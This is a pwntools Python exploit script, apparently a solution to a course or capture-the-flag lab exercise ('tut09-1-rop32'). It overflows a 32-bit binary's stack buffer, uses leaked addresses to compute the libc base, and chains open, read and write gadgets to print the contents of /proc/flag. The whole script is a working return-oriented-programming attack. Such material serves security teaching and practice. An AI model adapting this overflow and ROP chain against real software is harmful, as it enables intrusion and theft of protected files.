from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

TARGET = "/home/lab09/tut09-1-rop32/target"

p = process(TARGET)
p.recvline()

addr_gbuf = int(p.recvline().strip().split(b": ")[-1], 16)
# print(hex(addr_gbuf))
addr_argc = int(p.recvline().strip().split(b": ")[-1], 16)
addr_system = int(p.recvline().strip().split(b": ")[-1], 16)
addr_printf = int(p.recvline().strip().split(b": ")[-1], 16)

offset = 140

# addr_argc - buf = 208

LIBC = ELF("/lib/i386-linux-gnu/libc.so.6")
offset_system = LIBC.symbols["system"]

libc_base = addr_system - offset_system
print(hex(libc_base))

addr_open = libc_base + LIBC.symbols["open"]
addr_read = libc_base + LIBC.symbols["read"]
addr_write = libc_base + LIBC.symbols["write"]

add_pppr = 0x080492a1
add_ppr = add_pppr + 1

# buf < "proc/flag\0"
addr_buf = addr_argc - 208

payload = b"/proc/flag\0"
len_flag_str = len(payload)
payload += b"A" * (140 - len_flag_str)

# open("/proc/flag", 0)
payload += p32(addr_open) # original ret
payload += p32(add_ppr) # open's retaddr
payload += p32(addr_buf) # buf ptr to /proc/flag
payload += p32(0) # O_RDONLY

# read(3, addr_buf, 1040)
payload += p32(addr_read)
payload += p32(add_pppr)
payload += p32(3)
payload += p32(addr_gbuf)
payload += p32(1040)

# write(1, addr_buf, 1040)
payload += p32(addr_write)
payload += p32(0xdeadbeef)
payload += p32(1) # stdout
payload += p32(addr_gbuf)
payload += p32(1040)

p.sendline(payload)

p.interactive()